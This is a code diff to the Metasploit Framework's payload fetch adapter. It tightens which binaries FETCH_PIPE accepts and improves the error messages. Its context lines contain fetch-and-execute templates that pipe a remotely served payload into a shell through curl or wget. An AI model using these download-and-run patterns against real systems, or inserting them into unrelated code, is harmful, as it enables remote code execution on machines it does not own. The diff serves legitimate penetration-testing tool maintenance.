@@ -88,8 +88,10 @@ module Msf::Payload::Adapter::Fetch
     opts[:code] = super
     @srvexe = generate_payload_exe(opts)
     if datastore['FETCH_PIPE']
-      unless %w[WGET CURL].include?(datastore['FETCH_COMMAND'].upcase)
-        fail_with(Msf::Module::Failure::BadConfig, 'Unsupported Binary Selected for FETCH_PIPE option')
+      supported_binaries = %w[CURL]
+      supported_binaries = %w[WGET CURL] if linux?
+      unless supported_binaries.include?(datastore['FETCH_COMMAND'].upcase)
+        fail_with(Msf::Module::Failure::BadConfig, "Unsupported binary selected for FETCH_PIPE option: #{datastore['FETCH_COMMAND']}, must be WGET or CURL.")
       end
       @pipe_cmd = generate_fetch_commands
       @pipe_cmd << "\n" if windows? #need CR when we pipe command in Windows
@@ -116,8 +118,7 @@ module Msf::Payload::Adapter::Fetch
     when 'CURL'
       return _generate_curl_pipe
     else
-      fail_with(Msf::Module::Failure::BadConfig, 'Unsupported Binary Selected for FETCH_PIPE option')
-    end
+      fail_with(Msf::Module::Failure::BadConfig, "Unsupported binary selected for FETCH_PIPE option: #{datastore['FETCH_COMMAND']}, must be WGET or CURL.")    end
   end
 
   def generate_fetch_commands
@@ -325,7 +326,7 @@ module Msf::Payload::Adapter::Fetch
     when 'TFTP'
       return "curl -s tftp://#{_download_pipe} | #{execute_cmd}"
     else
-      fail_with(Msf::Module::Failure::BadConfig, 'Unsupported Binary Selected')
+      fail_with(Msf::Module::Failure::BadConfig, "Unsupported protocol: #{fetch_protocol.inspect}")
     end
   end
 
@@ -397,7 +398,7 @@ module Msf::Payload::Adapter::Fetch
     when 'HTTP'
       return "wget -qO - http://#{_download_pipe} | sh"
     else
-      return nil
+      fail_with(Msf::Module::Failure::BadConfig, "Unsupported protocol: #{fetch_protocol.inspect}")
     end
   end
 
